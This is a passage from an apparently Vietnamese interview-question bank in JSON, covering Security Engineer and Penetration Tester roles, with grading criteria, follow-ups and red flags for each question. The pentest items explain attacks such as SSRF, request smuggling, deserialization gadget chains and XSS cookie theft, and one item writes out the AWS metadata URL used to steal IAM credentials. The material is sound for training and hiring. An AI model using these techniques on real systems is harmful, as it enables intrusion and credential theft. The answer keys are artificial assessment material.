          "Tại tầng 7: Bật chế độ 'Under Attack Mode' của WAF, yêu cầu xác thực JavaScript Challenge đối với các kết nối nghi vấn nhắm vào endpoint tìm kiếm",
          "Phối hợp với nhà cung cấp dịch vụ mạng (ISP) thiết lập Blackholing (BGP Remotely Triggered Black Hole) ở biên mạng nếu lưu lượng vượt quá dung lượng kênh truyền"
        ],
        "followUps": [
          "Làm thế nào để phân biệt giữa đợt tăng traffic đột biến do người dùng thật vào giờ khuyến mãi và một đợt tấn công DDoS?",
          "Cách bảo vệ địa chỉ IP gốc của máy chủ (Origin IP) không bị lộ để kẻ tấn công không thể bypass qua WAF?"
        ],
        "tags": [
          "DDoS Mitigation",
          "Anycast Scrubbing",
          "Under Attack Mode",
          "Origin Protection",
          "Layer 7 Flood"
        ],
        "sourceRefs": [
          "https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cố gắng nâng cấp cấu hình phần cứng server và tăng băng thông mạng một cách vô vọng trước cuộc tấn công 100Gbps"
        ]
      },
      {
        "id": "SEC_ENG-SCEN-06",
        "role": "Security Engineer",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Tình huống: Một kỹ sư phần mềm vô tình đẩy tệp cấu hình chứa AWS Root Access Key lên một kho lưu trữ GitHub công khai. Chỉ sau 10 phút, bot quét mã độc trên mạng đã phát hiện và bắt đầu tự động tạo hàng loạt máy chủ EC2 cấu hình cao để đào tiền ảo (Crypto-mining). Em thực hiện quy trình ứng cứu sự cố rò rỉ khóa này thế nào?",
        "evaluationCriteria": [
          "Bước 1: Vô hiệu hóa (Deactivate) và Xóa ngay lập tức cặp Access Key bị lộ trên AWS IAM Console trong vòng 1 phút đầu tiên",
          "Bước 2: Rà soát và tiêu diệt (Terminate) toàn bộ các máy chủ EC2 lạ, vùng địa lý lạ do kẻ tấn công vừa khởi tạo; kiểm tra xem chúng có kịp tạo thêm IAM User phụ nào để duy trì quyền kiểm soát (Persistence) hay không",
          "Bước 3: Tích hợp công cụ quét bí mật tự động (GitGuardian, Trufflehog) vào Pre-commit hooks của team dev để chặn việc commit secrets trong tương lai"
        ],
        "followUps": [
          "Làm thế nào để liên hệ với AWS Support giải trình sự cố và xin miễn giảm chi phí phát sinh hàng chục nghìn USD do kẻ tấn công đào tiền ảo?",
          "Quy trình xoay vòng toàn bộ các thông tin xác thực khác có nguy cơ bị lộ liên đới?"
        ],
        "tags": [
          "Secret Leakage",
          "Compromised Credentials",
          "GitGuardian",
          "Crypto-mining Remediation",
          "AWS Incident"
        ],
        "sourceRefs": [
          "https://docs.aws.amazon.com/security/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ xóa file trên GitHub mà không vô hiệu hóa Access Key trên AWS console"
        ]
      },
      {
        "id": "SEC_ENG-CV-01",
        "role": "Security Engineer",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Trong dự án triển khai hệ thống kiến trúc an ninh tổng thể mà em ghi trên CV: Em đã trực tiếp thiết kế những phân vùng mạng nào, cấu hình những giải pháp bảo mật nào (Firewall, WAF, VPN, SIEM) và con số định lượng về việc giảm thiểu số lượng sự cố an ninh sau dự án là gì?",
        "evaluationCriteria": [
          "Trình bày chi tiết kiến trúc: phân tách DMZ, App, DB, OAM bằng tường lửa thế hệ mới Palo Alto; triển khai AWS WAF và giải pháp ZTNA",
          "Cấu hình chính sách Least Privilege và tự động hóa rà soát lỗ hổng định kỳ",
          "Dẫn chứng kết quả định lượng: giảm 90% số lượng sự cố tấn công thành công, không để xảy ra bất kỳ đợt rò rỉ dữ liệu nào trong 2 năm vận hành và đạt 100% tiêu chuẩn kiểm toán PCI-DSS"
        ],
        "followUps": [
          "Thách thức kỹ thuật lớn nhất khi triển khai kiến trúc an ninh mới vào hệ thống đang chạy của công ty là gì?",
          "Em đã giải quyết bài toán suy giảm hiệu năng mạng (Network Latency) do các thiết bị kiểm tra an ninh gây ra như thế nào?"
        ],
        "tags": [
          "CV Validation",
          "Security Architecture",
          "Network Security",
          "PCI-DSS Compliance",
          "Incident Reduction"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nói chung chung là làm bảo mật nhưng không nhớ rõ mô hình mạng, thông số tường lửa hay kết quả cụ thể"
        ]
      },
      {
        "id": "SEC_ENG-CV-02",
        "role": "Security Engineer",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "CV của em có đề cập đến việc quản lý và vận hành giải pháp WAF bảo vệ cho hệ thống có hàng triệu lượt truy cập mỗi ngày. Hãy chia sẻ quy trình tinh chỉnh bộ luật (Rule Tuning) của em để đưa tỷ lệ chặn nhầm (False Positive Rate) xuống dưới 0.1% mà vẫn đảm bảo an toàn?",
        "evaluationCriteria": [
          "Áp dụng quy trình chạy thử nghiệm (Count/Log Mode) trong 14 ngày trước khi chính thức chuyển sang chế độ Chặn (Block Mode)",
          "Phân tích nhật ký WAF logs chi tiết để xác định các luồng nghiệp vụ hợp lệ vô tình kích hoạt rule (như khách hàng nhập mã code trong ô phản hồi)",
          "Tạo các ngoại lệ chính xác (Exceptions / Exclusions) có điều kiện giới hạn thay vì tắt bỏ toàn bộ rule"
        ],
        "followUps": [
          "Khi hệ thống phát hành một tính năng thanh toán mới, em phối hợp với team Dev để cập nhật WAF rules ra sao?",
          "Cách xử lý khi một nhà mạng viễn thông lớn bị WAF chặn nhầm hàng loạt do trùng dải IP?"
        ],
        "tags": [
          "WAF Tuning",
          "False Positive Reduction",
          "Count Mode",
          "WAF Exceptions",
          "High Traffic Defense"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Bật chế độ Block ngay lập tức khiến hàng nghìn khách hàng thực tế bị chặn không thể thanh toán"
        ]
      },
      {
        "id": "SEC_ENG-CV-03",
        "role": "Security Engineer",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Em ghi trên CV kinh nghiệm quản lý vòng đời lỗ hổng bảo mật (Vulnerability Management). Hãy mô tả cách em đã xây dựng quy trình phối hợp với các đội ngũ phát triển phần mềm để vá các lỗ hổng đạt SLA, và công cụ em đã dùng để theo dõi tiến độ?",
        "evaluationCriteria": [
          "Tích hợp máy quét tự động (Tenable/Qualys) với Jira Service Management: tự động tạo ticket và gán cho đúng team sở hữu dịch vụ",
          "Thiết lập SLA rõ ràng có sự phê duyệt của CTO: Critical vá trong 24h, High trong 7 ngày, Medium trong 30 ngày",
          "Tổ chức họp rà soát hàng tuần (Weekly Vulnerability Triage) và xây dựng dashboard theo dõi tỷ lệ tuân thủ SLA của từng nhóm"
        ],
        "followUps": [
          "Khi đội ngũ phát triển từ chối vá một lỗ hổng nghiêm trọng vì sợ ảnh hưởng tính năng kinh doanh, em xử lý thế nào?",
          "Quy trình cấp ngoại lệ rủi ro (Risk Acceptance Exception) có thời hạn diễn ra ra sao?"
        ],
        "tags": [
          "Vulnerability SLA",
          "Jira Integration",
          "Vulnerability Triage",
          "Risk Acceptance",
          "Dev Alignment"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ biết gửi email nhắc nhở chung chung mà không có quy trình phân loại trách nhiệm hay SLA đo lường"
        ]
      },
      {
        "id": "SEC_ENG-CV-04",
        "role": "Security Engineer",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Trong một dự án thiết kế và triển khai giải pháp Zero Trust hoặc ZTNA mà em từng thực hiện trên CV: Hãy trình bày chi tiết về cách thức kiểm tra tư thế thiết bị (Device Posture Assessment), chính sách truy cập có điều kiện và trải nghiệm của nhân viên thay đổi ra sao khi chuyển đổi từ VPN truyền thống sang ZTNA?",
        "evaluationCriteria": [
          "Tích hợp Identity Provider (Okta) với EDR (CrowdStrike) để đánh giá trạng thái an toàn của máy tính theo thời gian thực",
          "Thiết lập chính sách: Chỉ cho phép truy cập hệ thống kế toán nếu máy tính thuộc sở hữu công ty, đã bật mã hóa BitLocker và điểm an ninh ZTA Score > 80",
          "Trải nghiệm nhân viên: Không cần bật tắt VPN thủ công, kết nối mượt mà và an toàn theo từng ứng dụng"
        ],
        "followUps": [
          "Khó khăn lớn nhất khi triển khai ZTNA cho các nhân sự làm việc tự do hoặc đối tác bên thứ ba (Third-party vendors) là gì?",
          "Cách đo lường mức độ giảm thiểu bề mặt tấn công (Attack Surface Reduction) sau khi tắt VPN?"
        ],
        "tags": [
          "ZTNA Deployment",
          "Device Posture",
          "Conditional Access",
          "VPN Replacement",
          "Attack Surface"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/pubs/sp/800/207/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không giải thích được cơ chế hoạt động của ZTNA hoặc nhầm lẫn ZTNA với việc chỉ cài thêm MFA cho VPN"
        ]
      },
      {
        "id": "SEC_ENG-CV-05",
        "role": "Security Engineer",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "CV của em có nhắc đến việc tham gia ứng phó và xử lý sự cố an ninh thực tế (Security Incident Response). Hãy chia sẻ chi tiết về sự cố nghiêm trọng nhất mà em từng tham gia giải quyết (tính chất sự cố, thời gian cô lập, nguyên nhân gốc rễ và bài học rút ra)?",
        "evaluationCriteria": [
          "Mô tả bối cảnh sự cố cụ thể (vd: máy chủ nội bộ bị nhiễm mã độc đào tiền ảo qua lỗ hổng RCE chưa vá)",
          "Trình bày hành động dứt khoát: cô lập mạng trong 20 phút, phân tích tiến trình độc hại và truy vết địa chỉ IP nguồn tấn công",
          "Nguyên nhân gốc rễ: do một cổng dịch vụ thử nghiệm bị dev mở ra ngoài Internet mà không qua tường lửa; bài học: tự động hóa việc quét bề mặt tấn công bên ngoài (ASM) liên tục"
        ],
        "followUps": [
          "Em đã viết báo cáo Post-Incident Review cho ban giám đốc như thế nào?",
          "Những biện pháp kỹ thuật nào đã được triển khai ngay sau đó để đảm bảo sự cố không bao giờ lặp lại?"
        ],
        "tags": [
          "Incident Response Experience",
          "Root Cause Analysis",
          "Attack Surface Management",
          "Post-Incident Review"
        ],
        "sourceRefs": [
          "https://www.sans.org/white-papers/33342/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Kể câu chuyện mơ hồ, không nhớ được nguyên nhân gốc rễ hoặc không nêu được biện pháp khắc phục lâu dài"
        ]
      },
      {
        "id": "SEC_ENG-BEHAV-01",
        "role": "Security Engineer",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Khi các kỹ sư phần mềm phàn nàn rằng các chính sách bảo mật của em quá khắt khe (chặn quyền truy cập, bắt đổi mật khẩu phức tạp, kiểm duyệt tải phần mềm) làm giảm năng suất làm việc của họ, em xử lý sự phản kháng này và xây dựng tinh thần hợp tác ra sao?",
        "evaluationCriteria": [
          "Lắng nghe cởi mở nỗi đau của lập trình viên; hiểu rằng bảo mật không được phép trở thành 'Phòng ban nói Không' (Department of No)",
          "Giải thích bối cảnh rủi ro thực tế: giúp họ hiểu hậu quả pháp lý và tài chính nếu công ty bị lộ dữ liệu",
          "Chủ động đơn giản hóa trải nghiệm (Security UX): triển khai đăng nhập một lần (SSO), quản lý mật khẩu tự động (1Password) và cấp quyền tự động hóa có kiểm soát để kỹ sư làm việc thuận tiện"
        ],
        "followUps": [
          "Làm thế nào để biến các kỹ sư trở thành đồng minh bảo mật thay vì tìm cách đi đường vòng (Shadow IT) để lách luật?",
          "Một lần em đã nhượng bộ và điều chỉnh chính sách bảo mật linh hoạt hơn để phục vụ tiến độ dự án là gì?"
        ],
        "tags": [
          "Overcoming Security Resistance",
          "Security UX",
          "Shadow IT Prevention",
          "Collaborative Mindset"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Dùng quyền lực áp đặt quy chế cứng nhắc và đe dọa xử phạt những ai thắc mắc"
        ]
      },
      {
        "id": "SEC_ENG-BEHAV-02",
        "role": "Security Engineer",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Khi xảy ra một sự cố an ninh nghiêm trọng làm rò rỉ dữ liệu, các phòng ban bắt đầu hoảng loạn và có xu hướng đổ lỗi cho nhau (Kỹ sư đổ lỗi cho Vận hành, Vận hành đổ lỗi cho Bảo mật). Em thể hiện vai trò lãnh đạo bình tĩnh và điều phối giải quyết khủng hoảng ra sao?",
        "evaluationCriteria": [
          "Lập tức thiết lập trật tự: tuyên bố nguyên tắc Văn hóa không đổ lỗi (Blameless Culture) trong suốt quá trình xử lý sự cố",
          "Tập trung 100% năng lượng vào mục tiêu dập tắt thảm họa: cô lập hệ thống, vá lỗ hổng và khôi phục dịch vụ an toàn",
          "Duy trì kênh thông tin minh bạch, cập nhật tình hình định kỳ mỗi 30 phút cho Ban Giám đốc và các phòng ban liên quan để dẹp tan tin đồn thất thiệt"
        ],
        "followUps": [
          "Làm thế nào để duy trì sự tỉnh táo và tinh thần thép khi phải làm việc liên tục 24 giờ trong phòng tác chiến (War Room)?",
          "Sau sự cố, em dẫn dắt buổi họp kiểm điểm trách nhiệm một cách xây dựng, công bằng ra sao?"
        ],
        "tags": [
          "Crisis Leadership",
          "Blameless Culture",
          "War Room Management",
          "Executive Communication"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cũng bị cuốn vào vòng xoáy đổ lỗi, công kích đồng nghiệp để tự bảo vệ vị trí của mình"
        ]
      },
      {
        "id": "SEC_ENG-BEHAV-03",
        "role": "Security Engineer",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Khi em phát hiện một Giám đốc cấp cao (VIP) trong công ty cố tình vi phạm chính sách an ninh (sử dụng mật khẩu cực kỳ yếu, tắt phần mềm diệt virus trên máy cá nhân để chơi game), em xử lý tình huống tế nhị này như thế nào để vừa đảm bảo an toàn vừa giữ được sự tôn trọng?",
        "evaluationCriteria": [
          "Không bỏ qua vì vị trí của họ, nhưng cũng không công khai chỉ trích làm mất mặt lãnh đạo",
          "Hẹn gặp riêng 1-1 với thái độ lịch sự, tôn trọng: giải thích rằng các vị trí lãnh đạo chính là mục tiêu số 1 bị tin tặc săn đón (Whaling Attack)",
          "Đích thân hỗ trợ cấu hình máy tính cho sếp một cách thuận tiện nhất (cài đặt phần mềm quản lý mật khẩu, bật xác thực sinh trắc học vân tay) để sếp vừa an toàn vừa không bị phiền phức"
        ],
        "followUps": [
          "Nếu vị giám đốc đó kiên quyết từ chối hợp tác, em sẽ leo thang vấn đề lên cấp CISO/CEO ra sao?",
          "Cách thiết lập các biện pháp kiểm soát bù trừ (Compensating Controls) để bảo vệ tài khoản của các nhân sự VIP?"
        ],
        "tags": [
          "VIP Security Exceptions",
          "Whaling Defense",
          "Diplomatic Communication",
          "Compensating Controls"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Sợ sếp nên nhắm mắt làm ngơ để lỗ hổng tồn tại, hoặc mách lẻo gây căng thẳng cá nhân"
        ]
      },
      {
        "id": "SEC_ENG-BEHAV-04",
        "role": "Security Engineer",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Trong quá trình đánh giá rủi ro an ninh cho một tính năng kinh doanh mới chuẩn bị ra mắt, em phát hiện ra một rủi ro bảo mật ở mức độ Trung bình (Medium). PM năn nỉ em ký duyệt bỏ qua để kịp ngày khai trương vì hợp đồng quảng cáo đã ký hàng tỷ đồng. Em ra quyết định và thương lượng như thế nào?",
        "evaluationCriteria": [
          "Đánh giá thực tế khả năng bị khai thác (Exploitability) và tác động kinh doanh thực sự trong điều kiện vận hành cụ thể",
          "Nếu rủi ro không làm lộ dữ liệu nhạy cảm: đồng ý cho release tạm thời kèm theo Biên bản chấp nhận rủi ro có điều kiện (Conditional Sign-off)",
          "Yêu cầu cam kết văn bản: đội ngũ phát triển phải triển khai biện pháp kiểm soát tạm thời (WAF rule) và hoàn thành bản vá triệt để trong vòng 14 ngày sau khi ra mắt"
        ],
        "followUps": [
          "Làm thế nào để rèn luyện tư duy 'Đánh giá rủi ro kinh doanh' thay vì tư duy 'Kỹ thuật tuyệt đối hóa'?",
          "Khi nào thì em bắt buộc phải nói 'KHÔNG' kiên quyết dù đối diện với áp lực doanh số khủng khiếp?"
        ],
        "tags": [
          "Risk Acceptance Sign-off",
          "Business Alignment",
          "Compensating Controls",
          "Principled Negotiation"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cứng nhắc từ chối máy móc làm đổ bể hợp đồng kinh doanh lớn của công ty dù rủi ro có thể kiểm soát tạm thời"
        ]
      },
      {
        "id": "SEC_ENG-BEHAV-05",
        "role": "Security Engineer",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Lĩnh vực an toàn thông tin thay đổi với tốc độ chóng mặt mỗi ngày (các kỹ thuật tấn công mới, lỗ hổng Zero-day, chiến thuật của các nhóm APT mới). Em duy trì thói quen tự học tập, cập nhật kiến thức chuyên môn và chia sẻ lại cho đồng nghiệp như thế nào?",
        "evaluationCriteria": [
          "Theo dõi hàng ngày các nguồn tin tức an ninh mạng uy tín (The Hacker News, BleepingComputer, CISA Alerts, Twitter InfoSec community)",
          "Tham gia các phòng thực hành thực chiến (TryHackMe, Hack The Box) và phân tích các báo cáo phân tích mã độc chi tiết",
          "Định kỳ tổ chức các buổi chia sẻ kiến thức nội bộ (Security Briefing) để cảnh báo sớm cho toàn công ty về các nguy cơ tấn công mới xuất hiện"
        ],
        "followUps": [
          "Một công nghệ hoặc phương thức tấn công mới nhất trong 6 tháng qua mà em cảm thấy ấn tượng nhất là gì?",
          "Em đã từng tham gia đóng góp cho các dự án an ninh mã nguồn mở hoặc cộng đồng bảo mật nào chưa?"
        ],
        "tags": [
          "Continuous Learning",
          "Threat Landscape Tracking",
          "Knowledge Sharing",
          "InfoSec Community"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Thụ động không tự giác cập nhật kiến thức mới, chỉ chờ công ty đào tạo, giấu kiến thức không chia sẻ với đồng nghiệp"
        ]
      }
    ]
  },
  {
    "role": "Penetration Tester (PenTest)",
    "group": "cybersecurity",
    "groupLabel": "An toàn thông tin (Cybersecurity)",
    "aliases": [
      "penetration tester",
      "pentester",
      "pentest",
      "chuyen vien danh gia an ninh mang",
      "ethical hacker",
      "kiem thu bao mat",
      "chuyen vien pentest"
    ],
    "questions": [
      {
        "id": "PENTEST-FOUND-01",
        "role": "Penetration Tester (PenTest)",
        "category": "foundation",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Trong Penetration Tester (PenTest), phân biệt Black-box vs White-box, OSSTMM, OWASP WSTG, Rules of Engagement; mô tả khi nào em áp dụng chúng trong bài tập.",
        "evaluationCriteria": [
          "Giải thích đúng ý nghĩa cơ bản của Black-box vs White-box.",
          "Phân biệt được các khái niệm liên quan OSSTMM, OWASP WSTG, Rules of Engagement ở mức nhập môn.",
          "Đưa ra được ví dụ học tập phù hợp với vị trí Penetration Tester (PenTest)."
        ],
        "followUps": [
          "Nếu mới học Black-box vs White-box, em sẽ dùng ví dụ đơn giản nào để tự kiểm tra mình đã hiểu?"
        ],
        "tags": [
          "Black-box vs White-box",
          "OSSTMM",
          "OWASP WSTG",
          "Rules of Engagement",
          "Exploit Chain"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "https://csrc.nist.gov/publications/detail/sp/800-115/final"
        ],
        "redFlags": [
          "Nhầm lẫn khái niệm nền tảng hoặc không thể đưa ra ví dụ cơ bản."
        ]
      },
      {
        "id": "PENTEST-FOUND-02",
        "role": "Penetration Tester (PenTest)",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Phân tích bản chất kỹ thuật của Lỗ hổng Tham chiếu đối tượng trực tiếp không an toàn (Insecure Direct Object References - IDOR) và Phân quyền mức đối tượng bị hỏng (Broken Object Level Authorization - BOLA theo OWASP API Security Top 10). Làm thế nào để tự động hóa hoặc tìm kiếm IDOR thủ công khi tham số định danh là chuỗi UUID khó đoán?",
        "evaluationCriteria": [
          "IDOR/BOLA xảy ra khi ứng dụng nhận ID thực thể từ người dùng (vd: `/api/orders?id=123`) mà không kiểm tra xem người dùng hiện tại có quyền sở hữu đơn hàng đó hay không",
          "Khi ID là UUID: tìm kiếm rò rỉ UUID từ các API endpoint khác (danh sách công khai, tìm kiếm bạn bè), hoán đổi UUID giữa hai tài khoản kiểm thử đã tạo sẵn",
          "Sử dụng các tiện ích Burp Suite mở rộng (như Autorize) để tự động gửi request của User A bằng phiên làm việc (Cookie/Token) của User B để phát hiện chênh lệch phản hồi"
        ],
        "followUps": [
          "Phân biệt giữa BOLA (kiểm soát đối tượng ngang hàng) và BFLA (Broken Function Level Authorization - kiểm soát chức năng dọc cấp quản trị)?",
          "Giải pháp khắc phục IDOR triệt để nhất ở tầng backend framework?"
        ],
        "tags": [
          "IDOR",
          "BOLA",
          "OWASP API Top 10",
          "Autorize Extension",
          "Access Control"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "https://portswigger.net/web-security"
        ],
        "redFlags": [
          "Cho rằng thay đổi ID số tự tăng bằng chuỗi UUID ngẫu nhiên là đã khắc phục hoàn toàn lỗ hổng IDOR"
        ]
      },
      {
        "id": "PENTEST-FOUND-03",
        "role": "Penetration Tester (PenTest)",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Cơ chế tấn công Yêu cầu giả mạo từ phía máy chủ (Server-Side Request Forgery - SSRF): Phân biệt Basic SSRF và Blind SSRF. Kẻ tấn công khai thác SSRF như thế nào để đọc siêu dữ liệu đám mây (AWS/GCP Instance Metadata Service - IMDS) và chiếm đoạt IAM Role Credentials?",
        "evaluationCriteria": [
          "SSRF xảy ra khi máy chủ nhận một URL từ người dùng và tự động thực hiện HTTP request đến địa chỉ đó mà không kiểm duyệt chặt chẽ",
          "Khai thác đọc AWS IMDSv1: ép server gọi tới `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]` để lấy trộm Access Key tạm thời của máy chủ",
          "Blind SSRF: Máy chủ không trả nội dung phản hồi về màn hình; kẻ tấn công xác nhận bằng cách ép máy chủ gọi về máy chủ điều khiển (Burp Collaborator / Interactsh) qua giao diện DNS/HTTP"
        ],
        "followUps": [
          "Cơ chế phòng thủ AWS IMDSv2 (Session-oriented token) vô hiệu hóa kỹ thuật khai thác SSRF truyền thống ra sao?",
          "Các kỹ thuật vượt qua bộ lọc URL (Bypass URL Filter) bằng DNS Rebinding hoặc ký hiệu số thập phân của địa chỉ IP?"
        ],
        "tags": [
          "SSRF",
          "Blind SSRF",
          "AWS Metadata IMDS",
          "DNS Rebinding",
          "Burp Collaborator"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security",
          "https://owasp.org/www-project-top-ten/"
        ],
        "redFlags": [
          "Chỉ chặn tên miền `localhost` hoặc IP `127.0.0.1` bằng blacklist đơn giản dễ dàng bị qua mặt"
        ]
      },
      {
        "id": "PENTEST-FOUND-04",
        "role": "Penetration Tester (PenTest)",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Bản chất kỹ thuật của Lỗ hổng Buôn lậu yêu cầu HTTP (HTTP Request Smuggling): Sự bất đồng bộ trong việc xử lý tiêu đề `Content-Length` (CL) và `Transfer-Encoding: chunked` (TE) giữa Reverse Proxy và Máy chủ phụ trợ (Backend Server) dẫn đến các biến thể CL.TE, TE.CL và TE.TE như thế nào?",
        "evaluationCriteria": [
          "Front-end proxy và Back-end server không thống nhất về ranh giới kết thúc của một HTTP request trong luồng kết nối TCP tái sử dụng (Keep-alive)",
          "CL.TE: Front-end dùng Content-Length còn Back-end dùng Transfer-Encoding; phần đuôi của request 1 bị cắt lại và dán vào đầu của request 2 của người dùng tiếp theo",
          "Hậu quả: Chiếm đoạt phiên làm việc của người dùng khác (Session Hijacking), vượt qua kiểm soát truy cập của WAF, hoặc đầu độc bộ nhớ đệm (Web Cache Poisoning)"
        ],
        "followUps": [
          "Tại sao việc nâng cấp toàn diện lên giao thức HTTP/2 hoặc HTTP/3 giúp triệt tiêu phần lớn các biến thể HTTP Request Smuggling?",
          "Kỹ thuật H2.CL và H2.TE Smuggling hoạt động ra sao khi front-end dùng HTTP/2 nhưng hạ cấp (Downgrade) sang HTTP/1.1 khi nói chuyện với backend?"
        ],
        "tags": [
          "HTTP Request Smuggling",
          "CL.TE",
          "TE.CL",
          "Web Cache Poisoning",
          "HTTP/2 Downgrade"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security"
        ],
        "redFlags": [
          "Nhầm lẫn HTTP Request Smuggling với kỹ thuật tấn công HTTP Parameter Pollution (HPP) thông thường"
        ]
      },
      {
        "id": "PENTEST-FOUND-05",
        "role": "Penetration Tester (PenTest)",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Cơ chế Khai thác Lỗ hổng Giải tuần tự hóa không an toàn (Insecure Deserialization): Khái niệm Gadget Chains (chuỗi các đoạn mã có sẵn trong thư viện ứng dụng) và cách kẻ tấn công xâu chuỗi chúng để đạt được Thực thi mã từ xa (RCE) trong Java (ysoserial), Python (pickle), hoặc PHP (unserialize)?",
        "evaluationCriteria": [
          "Deserialization biến đổi chuỗi byte/văn bản lưu trữ thành đối tượng (Object) trong bộ nhớ; nếu đối tượng được khởi tạo mà không kiểm tra lớp an toàn, các hàm ma thuật (Magic methods: `__wakeup`, `readObject`) sẽ tự động kích hoạt",
          "Gadget Chain: Lợi dụng các class hợp lệ có sẵn trong mã nguồn (vd: CommonsCollections trong Java) để xâu chuỗi lời gọi hàm từ khởi tạo đến việc gọi `Runtime.getRuntime().exec()`",
          "Hậu quả: Chiếm toàn quyền điều khiển máy chủ chỉ bằng cách gửi một payload đối tượng bị thao túng"
        ],
        "followUps": [
          "Tại sao việc dùng chữ ký số (HMAC signing) để bảo vệ chuỗi serialize chỉ là biện pháp phòng thủ một phần nếu khóa bí mật bị lộ?",
          "Tại sao nên chuyển đổi sang các định dạng dữ liệu thuần túy (JSON, Protocol Buffers) thay vì serialize nguyên cả đối tượng?"
        ],
        "tags": [
          "Insecure Deserialization",
          "Gadget Chains",
          "ysoserial",
          "Magic Methods",
          "Remote Code Execution"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "https://portswigger.net/web-security"
        ],
        "redFlags": [
          "Nghĩ rằng chỉ cần lọc các từ khóa nguy hiểm trong chuỗi byte là có thể ngăn chặn deserialization attack"
        ]
      },
      {
        "id": "PENTEST-FOUND-06",
        "role": "Penetration Tester (PenTest)",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Bản chất và phân loại Lỗ hổng Chèn mã kịch bản chéo trang (Cross-Site Scripting - XSS): Phân biệt Stored XSS, Reflected XSS và DOM-based XSS. Cơ chế bảo vệ của tiêu đề Chính sách bảo mật nội dung (Content Security Policy - CSP) và cờ HttpOnly trên Cookie giúp giảm thiểu tác hại của XSS ra sao?",
        "evaluationCriteria": [
          "Stored XSS: Mã độc được lưu vĩnh viễn vào DB của server và thực thi trên mọi người dùng xem trang; Reflected XSS: Mã độc nằm trong URL và phản xạ ngay lập tức; DOM XSS: Mã độc thực thi hoàn toàn ở client do JavaScript xử lý dữ liệu từ nguồn không an toàn (Source: location.hash -> Sink: innerHTML)",
          "HttpOnly: Ngăn JavaScript đọc Cookie chứa session token qua `document.cookie`, vô hiệu hóa kỹ thuật đánh cắp cookie trực tiếp",
          "CSP: Giới hạn các nguồn tài nguyên (script, style, image) được phép tải và cấm thực thi inline script (`unsafe-inline`)"
        ],
        "followUps": [
          "Làm thế nào kẻ tấn công có thể vượt qua (Bypass) một chính sách CSP được cấu hình lỏng lẻo bằng kỹ thuật JSONP hoặc Script Gadgets?",
          "Khái niệm 'Dangling Markup Injection' được dùng để trích xuất dữ liệu khi CSP cấm chạy script ra sao?"
        ],
        "tags": [
          "XSS",
          "Stored vs DOM XSS",
          "Content Security Policy",
          "HttpOnly Cookie",
          "CSP Bypass"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security",
          "https://owasp.org/www-project-top-ten/"
        ],
        "redFlags": [
          "Cho rằng đặt cờ HttpOnly là đã giải quyết triệt để vấn đề XSS và không cần mã hóa đầu ra (Contextual Output Encoding)"
        ]
      },
      {
        "id": "PENTEST-SKILL-01",
        "role": "Penetration Tester (PenTest)",
        "category": "practical_skills",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Mô phỏng Burp Suite Pro (Session Handling Rules, Burp Macros, Turbo Intruder, Race Condition Testing) cho Penetration Tester (PenTest): em chuẩn bị gì, thao tác nào và đo kết quả ra sao?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Burp Suite Pro trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
